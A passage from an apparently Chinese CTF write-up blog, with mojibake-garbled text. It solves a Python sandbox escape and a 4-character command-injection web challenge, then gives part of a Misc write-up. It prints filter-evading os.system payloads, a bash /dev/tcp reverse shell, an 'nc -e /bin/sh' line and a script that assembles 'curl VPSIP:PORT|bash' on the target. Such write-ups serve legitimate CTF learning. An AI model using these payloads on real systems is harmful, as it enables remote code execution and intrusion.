class="token punctuation">)</span><span class="token punctuation">.</span>searchmodules<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">del</span> modules<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>version<span class="token punctuation">}</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"What would you like to say?"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        text <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'&gt;&gt;&gt; '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>        check <span class="token operator">=</span> search_func<span class="token punctuation">(</span>banned<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"__"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> check<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Nope, we ain't letting you use </span><span class="token interpolation"><span class="token punctuation">{</span>check<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">!"</span></span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">"^(_?[A-Za-z0-9])*[A-Za-z](_?[A-Za-z0-9])*$"</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"You aren't getting through that easily, come on."</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">exec</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'globals'</span><span class="token punctuation">:</span> <span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'print'</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>å™«ï¼Œæ˜¯ <strong>Python æ²™ç®±</strong> å•Šï¼å°±å’Œ SSTI å·®ä¸å¤šå•¦ã€‚</p><p>æ˜¯ç»•ç»•ç»•å¥½äº†ï¼Œè¿™é¢˜å’Œå¹³å¸¸çš„æ²™ç®±é€ƒé€¸è¿˜æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œå°±æ˜¯ä»–é™åˆ¶äº†æ‰§è¡Œçš„ <code>globals</code> å’Œ <code>locals</code>ï¼Œè¿˜æŠŠ <code>sys.modules</code> éƒ½åˆ äº†ã€‚</p><p>å…ˆåœ¨æœ¬åœ°è¯•ç€è·‘ä¸€ä¸‹ï¼ŒæŠŠè¿‡æ»¤çš„éƒ¨åˆ†éƒ½æ³¨é‡Šæ‰ã€‚</p><p>æ¥çœ‹çœ‹ <code>globals</code> é‡Œæœ‰å•¥å‘¢ã€‚</p><p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210126204353008.png"></p><p>å¯ä»¥å‘ç°ï¼Œè™½ç„¶å…¨å±€çš„ <code>__builtins__</code> ä¹ˆå¾—äº†ï¼Œä½†åœ¨ <code>globals</code> å†…éƒ¨è¿˜æ˜¯å­˜åœ¨ <code>__builtins__</code> çš„ï¼Œå¥½è€¶ï¼</p><p>é‚£æˆ‘ä»¬å°±ç›´æ¥ç”¨è¿™ä¸ªå¥½äº†ï¼</p><p>ä½†æ˜¯ <code>getattr</code>, <code>reload</code> è¿™ç±»å†…ç½®å‡½æ•°éƒ½ä¹ˆå¾—äº†ï¼Œå¦‚æœåœ¨ç”¨åˆ°çš„æ¨¡å—å†…éƒ¨éœ€è¦ <code>__import__</code> çš„è¯ä¹Ÿç”¨ä¸æ¥ã€‚</p><p>è¯•äº†ä¸€æ®µæ—¶é—´ï¼Œå‘ç°ä¸‹é¢è¿™ä¸ªå¯è¡Œã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>ä¸‹é¢çœ‹çœ‹ å¦‚ä½•ç»•è¿‡è¿‡æ»¤ã€‚</p><p>å¾ˆæ˜æ˜¾å­—ç¬¦ä¸²çš„è¯æœ€ç®€å•ç›´æ¥å°±æ‹¼æ¥å¥½äº†ï¼Œå¯¹äºè°ƒç”¨å±æ€§/æ–¹æ³•çš„è¯ï¼Œå¯ä»¥ç”¨ <code>xx.__dict__[å‡½æ•°å](å‚æ•°)</code> çš„æ–¹å¼æ¥æ‰§è¡Œã€‚</p><p><em>ï¼ˆç¬¬äºŒæ­¥è¿‡æ»¤å¥½åƒä¹Ÿæ²¡å•¥ç”¨çš„äºšå­</em></p><p>äºæ˜¯ payloadï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'__imp'</span><span class="token string">'ort__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'sy'</span><span class="token string">'stem'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'__imp'</span><span class="token string">'ort__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'sy'</span><span class="token string">'stem'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat /flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>æ‰“è¿œç¨‹ï¼Œå¾—åˆ° flag</p><p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210126212949964.png" alt="image-20210126212949964"></p><blockquote><p><strong>Extensive reading:</strong></p><p><a href="https://www.freebuf.com/articles/network/203208.html">ä¸€æ–‡çœ‹æ‡‚Pythonæ²™ç®±é€ƒé€¸</a></p><p><a href="https://xz.aliyun.com/t/52/">Pythonæ²™ç®±é€ƒé€¸çš„nç§å§¿åŠ¿</a></p><p><a href="https://www.cnblogs.com/hf99/p/9753376.html">pythonæ²™ç›’é€ƒé€¸</a></p></blockquote><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h3><blockquote><p>can you please just hack me, I will execute all your commands but only 4 chars in length</p><p><a href="http://207.180.200.166:8000/">EU instance</a> </p><p><a href="http://45.134.3.200:8000/">US instance</a></p></blockquote><p>è®¿é—®å¾—åˆ°</p><pre class="language-none"><code class="language-none">use arg cmd for running a command and arg ?reset for clearing the env</code></pre><p><strong>åªå…è®¸4ä¸ªå­—ç¬¦çš„å‘½ä»¤æ‰§è¡Œ</strong>ï¼Œå””ï¼ŒæŒºç†Ÿæ‚‰çš„é¢˜ç›®ï¼Œç”šè‡³æœ‰åŸé¢˜ã€‚</p><p>æ¯”å¦‚ <em>HITCON 2017 CTF BabyFirst Revenge</em>ï¼Œè¿™ä¸ªç½‘ä¸Šå·¨å¤š WriteUpã€‚</p><p>è¿™ä¸ª server æ˜¯ gunicorn/19.7.1ï¼Œåº”è¯¥æ˜¯ python èµ·çš„å§ã€‚</p><p>å…ˆæ¥çœ‹çœ‹ å½“å‰ç›®å½•ä»¥åŠç›®å½•ä¸‹æœ‰å•¥ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># curl  "http://207.180.200.166:8000/?cmd=pwd"</span>/home/ctf/code/sandbox/22229031<span class="token comment"># curl  "http://207.180.200.166:8000/?cmd=pwd"</span><span class="token comment"># curl  "http://207.180.200.166:8000/?cmd=ls%20/"</span>bindevetcflag.txthomelibmediamntprocrootrunsbinsrvsystmpusrvar</code></pre><p>å¯è§åœ¨æ²™ç®±é‡Œï¼Œå½“å‰ç›®å½•ä¸‹ä¹ˆå¾—ä¸œè¥¿ï¼Œflag åœ¨æ ¹ç›®å½•ä¸‹ã€‚</p><p>é‚£ä¹ˆå°±éœ€è¦æ‰§è¡Œ <code>cat /flag.txt</code>ï¼Œæˆ–è€…ç®€ç•¥ä¸€ç‚¹ï¼Œ<code>cat /f*</code>.</p><p>ç„¶è€Œï¼Œä¸èƒ½ç”Ÿæˆå¸¦æœ‰ <code>/</code> çš„æ–‡ä»¶åï¼Œè¿˜æ˜¯å¾—ä»¥å‘½ä»¤çš„å½¢å¼æ¥æ‰§è¡Œã€‚</p><p>ä½†æ˜¯æœ‰ä¸ª trickï¼Œ<strong>ç”¨ <code>*</code> å¯ä»¥å¾—åˆ°å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•åŠæ–‡ä»¶åï¼Œè€Œä¸”èƒ½ç”¨æ–‡ä»¶åæ‰§è¡Œå‘½ä»¤</strong>ã€‚</p><p>å½“ç„¶è¿™ä¸ªæ˜¯æ’åºæ˜¯æŒ‰ç…§å­—æ¯é¡ºåºæ¥çš„ï¼Œç©ºæ ¼=&gt;æ•°å­—=&gt;å­—æ¯ã€‚</p><p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210131225509319.png" alt="trick"></p><p>äºæ˜¯å…ˆç”Ÿæˆä¸€ä¸ª åä¸º <code>cat</code> çš„æ–‡ä»¶ï¼Œç„¶åå†ç”¨ <code>*+å‚æ•°</code> å°±èƒ½æ‰§è¡Œå‘½ä»¤äº†ã€‚</p><p><strong>Payloadï¼š</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># curl "http://207.180.200.166:8000/?cmd=&gt;cat"</span><span class="token comment"># curl "http://207.180.200.166:8000/?cmd=*%20/f*"</span>flag<span class="token punctuation">{</span>ju57_g0tt@_5pl1t_Em3012<span class="token punctuation">}</span></code></pre><p>å°±èƒ½å¾—åˆ° flag äº†~</p><p><code>flag{ju57_g0tt@_5pl1t_Em3012}</code></p><br><p>å…¶å®æœ¬æ¥æ˜¯æƒ³ <strong>åå¼¹ shell</strong> çš„ï¼Œæœ¬åœ°æ‰“é€šäº†ï¼Œä½†ä¸çŸ¥é“ä¸ºå•¥è¿œç¨‹å¼¹ä¸å‡ºæ¥<em>ï¼ˆå¯èƒ½ä¸é€šå¤–ç½‘ï¼Ÿ</em> emmm</p><p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210131230800817.png" alt="æœ¬åœ°æ‰§è¡Œå‘½ä»¤"></p><p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210131231038304.png" alt="vpsä¸Šæ‹¿åˆ°shell"></p><p>VPS ä¸Šèµ·ä¸€ä¸ª web æœåŠ¡ï¼Œå†…å®¹ä¸º</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">&gt;&amp;</span> /dev/tcp/VPSIP/PORT <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span><span class="token comment"># æˆ–è€… nc -e /bin/sh VPSIP PORT</span></code></pre><p><strong>payload:</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding: utf-8</span><span class="token keyword">import</span> requests<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quotebaseurl <span class="token operator">=</span> <span class="token string">"http://207.180.200.166:8000/?cmd="</span>reset <span class="token operator">=</span> <span class="token string">"http://207.180.200.166:8000/?reset"</span><span class="token comment"># baseurl = "http://45.134.3.200:8000/?cmd="</span><span class="token comment"># reset = "http://45.134.3.200:8000/?reset"</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>reset<span class="token punctuation">)</span><span class="token comment"># æ–‡ä»¶ x å†…å®¹ä¸º ls -th &gt; g</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">"&gt;sl"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;ht-"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;g\&gt;"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;dir"</span><span class="token punctuation">,</span>    <span class="token string">"*&gt;v"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;rev"</span><span class="token punctuation">,</span>    <span class="token string">"*v&gt;x"</span><span class="token punctuation">]</span><span class="token comment"># curl VPSIP:PORT|bash</span>list2 <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">"&gt;bash"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;\|\\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;11\\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;11\\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;1:\\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;11\\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;1.\\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;11\\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;11.\\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;11.\\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;\ \\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;rl\\"</span><span class="token punctuation">,</span>    <span class="token string">"&gt;cu\\"</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> list1<span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl <span class="token operator">+</span> quote<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sending"</span><span class="token punctuation">,</span> quote<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'==&gt;'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> list2<span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl <span class="token operator">+</span> quote<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sending"</span><span class="token punctuation">,</span> quote<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'==&gt;'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ls -t'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>baseurl<span class="token operator">+</span>quote<span class="token punctuation">(</span><span class="token string">"ls -t"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'==&gt;'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sh x'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>baseurl<span class="token operator">+</span>quote<span class="token punctuation">(</span><span class="token string">"sh x"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'==&gt;'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sh g'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>baseurl<span class="token operator">+</span>quote<span class="token punctuation">(</span><span class="token string">"sh g"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'==&gt;'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>reset<span class="token punctuation">)</span></code></pre><p>BTW, è¿˜æœ‰<strong>å…¶ä»–çš„ trick</strong>ï¼Œæ¥æ€»ç»“äº†ä¸€ä¸‹ï¼Œæ”¾åˆ°ä¸‹é¢è¿™ç¯‡åšå®¢é‡Œäº†ã€‚</p><p><a href="https://miaotony.xyz/2021/01/31/CTF_web_CommandExecutionLimitedLength/">CTF | é™åˆ¶é•¿åº¦ä¸‹çš„å‘½ä»¤æ‰§è¡Œ æŠ€å·§æ±‡æ€»</a></p><blockquote><p><strong>References &amp; Extensive reading:</strong></p><p><a href="https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/">HITCON 2017 CTF BabyFirst Revenge</a> è¿™ä¸ªç”¨ tar å¾—åˆ°æ ¹ç›®å½•ä¸‹æ–‡ä»¶ï¼Œä¸è¿‡å‰ææ˜¯å½“å‰ç›®å½•æ–‡ä»¶èƒ½ä¸‹è½½ï¼Œphp å€’æ˜¯å¯ä»¥ã€‚</p><p><a href="https://github.com/bennofs/docs/blob/master/hitcon-2017/baby-first-revenge2.md">Baby First Revenge v2</a></p><p>etc.</p></blockquote><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿˜æŒºå¥½ç©çš„ï¼ŒMisc é¢˜ <del>åªæœ‰ä¸‰é¢˜å˜¤å˜¤å˜¤</del>ï¼Œå™¢ç»“æŸäº†æ‰å‘ç°åˆä¸Šäº†ä¸¤é¢˜æ–°é¢˜ï¼Œæ²¡äº‹äº†ã€‚</p><p><em>è·¨å¹´çº¢åŒ…å‡†å¤‡å‡ºäº†ï¼ˆå’•å’•å’•</em></p><p>ï¼ˆæºœäº†æºœäº†å–µ~</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 çºµæ¨ªæ¯ Misc&amp;Web WriteUp</title>
      <link href="2020/12/28/CTF_2020zongheng/"/>
      <url>2020/12/28/CTF_2020zongheng/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/12/28/CTF_2020zongheng/image-20201228143836286.png"></p><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>å‘œï¼Œè½¬çœ¼å°±åˆ° 2020 å¹´æœ«äº†ï¼Œäº‹æƒ…æœ‰ç‚¹æ‚æœ‰ç‚¹å°å¤šï¼Œå‘ç°æœ‰ä¸å°‘æƒ³åšçš„äº‹æƒ…å’•æ‰äº†ï¼Œç­‰åé¢å¹´ç»ˆæ€»ç»“å†è¯´å§ï¼ˆå¯èƒ½è¿™ä¸ªä¹Ÿå’•äº†å‘¢ 233.</p><p>å‰å‡ å¤©å¤©å¤©æœ‰æ¯”èµ›ï¼Œåä¸º XCTF ä¸‰åœºé¡¶ä¸ä½ï¼Œè¿˜æœ‰ DASCTF x BJDCTF4thï¼Œä¸è¿‡æœŸæœ«äº†é˜Ÿé‡Œæ²¡å¸ˆå‚…æ‰“ä¹Ÿæ²¡æ€ä¹ˆçœ‹ã€‚</p><p>ä¸è¿‡å‘¨æœ«å’Œé˜Ÿå‹ä¸€èµ·æ‰“äº†ä¸ªçºµæ¨ªæ¯ï¼Œé¢˜ç›®è¿˜æ˜¯æœ‰ç‚¹æ„æ€çš„ã€‚</p><blockquote><p><strong>å¹³å°åœ°å€ï¼š</strong></p><p><a href="https://www.ichunqiu.com/2020zongheng">https://www.ichunqiu.com/2020zongheng</a><br><a href="https://race.ichunqiu.com/2020zongheng">https://race.ichunqiu.com/2020zongheng</a></p></blockquote><p>è¿™é‡Œå†™å†™å‡ é“é¢˜ç›®çš„ WriteUp å§ã€‚  </p><p>ï¼ˆçœ‹äº†å¤§ä½¬ä»¬çš„ WPï¼Œé¡ºä¾¿å¤ç°äº†å‡ é¢˜</p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><blockquote><p>[0146, 0154, 0141, 0147, 0173, 0167, 063, 0154, 0143, 0157, 0155, 0145,  0137, 0164, 0157, 0137, 062, 0157, 0156, 0147, 0137, 0150, 063, 0156,  0147, 0137, 0142, 0145, 061, 0175]</p></blockquote><p>å…«è¿›åˆ¶è½¬å­—ç¬¦ä¸²</p><pre class="language-python" data-language="python"><code class="language-python">flags <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">146</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">141</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">173</span><span class="token punctuation">,</span> <span class="token number">167</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">143</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">145</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">164</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">156</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">156</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">142</span><span class="token punctuation">,</span> <span class="token number">145</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">175</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> flags<span class="token punctuation">:</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p><code>flag{w3lcome_to_2ong_h3ng_be1}</code></p><h3 id="é©¬èµ›å…‹"><a href="#é©¬èµ›å…‹" class="headerlink" title="é©¬èµ›å…‹"></a>é©¬èµ›å…‹</h3><p>åŸå›¾ï¼š</p><p><img src="/2020/12/28/CTF_2020zongheng/mosaic.png" alt="mosaic"></p><p>åˆ©ç”¨ <strong>Depix</strong> å·¥å…·</p><p><a href="https://github.com/beurtschipper/Depix">https://github.com/beurtschipper/Depix</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">python depix.py -p mosaic/mosaic.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o mosaic/output.png</code></pre><p>å¾—åˆ°</p><p><img src="/2020/12/28/CTF_2020zongheng/output.png" alt="output"></p><p>å†ç»“åˆ <code>debruinseq_notepad_Windows10_closeAndSpaced.png</code> è¿™å›¾ç‰‡äººå·¥è¯†åˆ«ä¸€ä¸‹ï¼Œå¾—åˆ° flagã€‚</p><p><code>flag{0123468abd68abd0123}</code></p><blockquote><p>æ²¡æƒ³åˆ°ä¹‹å‰é€› GitHub çœ‹åˆ°çš„å·¥å…·å±…ç„¶å°±åœ¨ CTF é¢˜ç›®é‡Œç”¨åˆ°äº†ï¼Œå¦™å•Š~</p></blockquote><h3 id="My-Secret"><a href="#My-Secret" class="headerlink" title="My_Secret"></a>My_Secret</h3><blockquote><p>LSB have a deep secret</p><p>PASS1 is 123456</p></blockquote><p>ä¸‹è½½ä¸‹æ¥ä¸¤å¼ å›¾ç‰‡ä¸€ä¸ªéŸ³é¢‘ï¼ŒéŸ³é¢‘å¬äº†æ²¡å•¥æ˜æ˜¾é—®é¢˜ã€‚</p><p><img src="/2020/12/28/CTF_2020zongheng/image-20201228150122612.png"></p><p><code>stego.png</code> æ‹¿ StegSolve çœ‹äº†ä¸€ä¸‹ RGB é‡Œ LSB éƒ½æœ‰æ•°æ®ã€‚</p><p>ç”¨ <a href="https://github.com/livz/cloacked-pixel">https://github.com/livz/cloacked-pixel</a> è¿™ä¸ªå·¥å…·æ¥è§£å¯† LSB æ•°æ®ï¼Œå¯†ç å°±æ˜¯é¢˜ç›®æ‰€ç»™çš„ 123456ã€‚</p><p><img src="/2020/12/28/CTF_2020zongheng/image-20201227005139560.png"></p><p>å¾—åˆ°å¯†é’¥ä¸º <code>38d668578a3686ab</code>ã€‚</p><p>å¯¹ <code>01 blood and wine.wav</code> ç”¨ DeepSound è§£å¯†ã€‚</p><p><img src="/2020/12/28/CTF_2020zongheng/image-20201226175128179.png"></p><p><img src="/2020/12/28/CTF_2020zongheng/image-20201226174646998.png" alt="pass"></p><p>å¾—åˆ°å¯†é’¥ä¸º <code>carrier</code>ã€‚</p><p>æ ¹æ®å›¾ç‰‡å’Œé¢˜ç›®æç¤ºï¼Œç”¨ oursecret è§£å¯†</p><p><img src="/2020/12/28/CTF_2020zongheng/image-20201226173249099.png"></p><p>æ‹¿åˆ° flag</p><p><img src="/2020/12/28/CTF_2020zongheng/image-20201226172757191.png"></p><p><code>flag{3072d7b4-d3f4-4d8a-bd8b-ac9285df11f2}</code></p><h3 id="babymaze2-beta"><a href="#babymaze2-beta" class="headerlink" title="babymaze2_beta"></a>babymaze2_beta</h3><p><em>ï¼ˆbabymaze1 èµ°è¿·å®«ï¼Œé˜Ÿå‹æ‰“çš„ï¼Œä¸è¿‡ç¯å¢ƒå…³äº†ï¼Œä¹Ÿæ²¡æºä»£ç ï¼Œå¤ç°ä¸äº†äº†å°±ä¸å†™äº†8</em></p><p>è¿™é¢˜ä¹Ÿæ˜¯èµ°è¿·å®«ï¼Œä¸è¿‡æ¯æ¬¡åªç»™å‡ºå½“å‰ä½ç½®é™„è¿‘çš„ 3*3 çš„ç¯å¢ƒæƒ…å†µã€‚</p><p>é™„ä»¶çš„è¯å€’æ˜¯ç»™äº†ä¸ª <code>.so</code> æ–‡ä»¶ï¼Œpython å†™çš„ï¼Œä¸ä¼šé€†å˜¤å˜¤å˜¤ã€‚</p><p>ä½†æ˜¯çœŸæ²¡æƒ³åˆ°èƒ½éé¢„æœŸï¼Œå­¦åˆ°äº†å­¦åˆ°äº†ã€‚</p><p>Python2 input RCE</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat flag'</span><span class="token punctuation">)</span></code></pre><p>å¤ç°æˆåŠŸå–µ~</p><p><img 